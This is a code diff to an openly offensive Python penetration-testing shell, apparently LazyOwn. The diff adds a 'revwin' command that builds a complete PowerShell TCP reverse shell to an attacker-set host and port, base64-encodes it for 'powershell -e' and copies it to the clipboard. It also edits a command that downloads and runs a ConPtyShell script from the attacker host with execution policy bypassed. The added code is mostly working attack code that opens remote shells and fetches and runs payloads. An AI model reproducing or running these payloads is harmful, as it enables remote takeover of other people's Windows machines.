@@ -27,6 +27,7 @@ import shlex
 import signal
 import json
 import time
+import base64
 from cmd import Cmd
 
 def print_error(error):
@@ -64,6 +65,13 @@ def check_lhost(lhost):
     """ chek if lhost is defined """
     if not lhost:
         print_error(f"lhost must be set, {GREEN}Example: set lhost 10.10.10.10, {WHITE}more info see help set, or help <TOPIC> {RESET}")
+        return False
+    return True
+
+def check_lport(lport):
+    """ chek if lport is defined """
+    if not lport:
+        print_error(f"lport must be set, {GREEN}Example: set lport 5555, {WHITE}more info see help set, or help <TOPIC> {RESET}")
         return False
     return True
 
@@ -1641,7 +1649,7 @@ class LazyOwnShell(Cmd):
             return
 
         os.system("cd sessions && wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 && wget https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip")
-        cmd = f"""IEX(New-Object New.WebClient).downloadString('http://{lhost}/Invoke-ConPtyShell.ps1') ; powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'Invoke-ConPtyShell.ps1 -RemoteIp {lhost} -RemotePort {lport} -Rows 24 -Cols 135'"""
+        cmd = f"""IEX(New-Object New.WebClient).downloadString('http://{lhost}/Invoke-ConPtyShell.ps1') ; powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'Invoke-ConPtyShell  -RemoteIp {lhost} -RemotePort {lport} -Rows 24 -Cols 135'"""
         os.system(f"echo '{cmd}' |  xclip -sel clip")
         print_msg(f"{cmd} {YELLOW} Copied to clipboard :D {RESET}")
         return
@@ -1884,6 +1892,29 @@ class LazyOwnShell(Cmd):
         os.system(f'echo -n"IEX(New-Object New.WebClient).downloadString(\'http://{lhost}/{line}\')"  iconv -t utf-16le | base64 -w 0 | xclip -sel clip')
         print_msg(f'Try... echo -n"IEX(New-Object New.WebClient).downloadString(\'http://{lhost}/{line}\')" | iconv -t utf-16le | base64')
         print_msg('copied to clipboard')
+        return
+
+    def do_revwin(self, line):
+        """Crea un payload encodeado en base64 especial para windows para ejecutar un ps1 desde lhost"""
+        
+        lhost = self.params['lhost']
+        lport = self.params['lport']           
+        if not check_lhost(lhost):
+            return
+        if not check_lport(lport):
+            return
+
+        cmd = '''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'''.replace('{lhost}', lhost).replace('{lport}', str(lport))
+        # Codifica el comando en UTF-16LE
+        utf16le_encoded = cmd.encode('utf-16le')
+        # Codifica el resultado en base64
+        base64_encoded = base64.b64encode(utf16le_encoded)
+        # Convierte el resultado a una cadena y elimina el salto de línea final
+        base64_string = base64_encoded.decode('utf-8').strip()
+        cmdd = f'''powershell -e {base64_string}'''
+        os.system(f'echo "{cmdd}" | xclip -sel clip')
+        print_msg(f'echo "{cmdd}" | xclip -sel clip')
+
         return
 
     def do_asprevbase64(self, line):
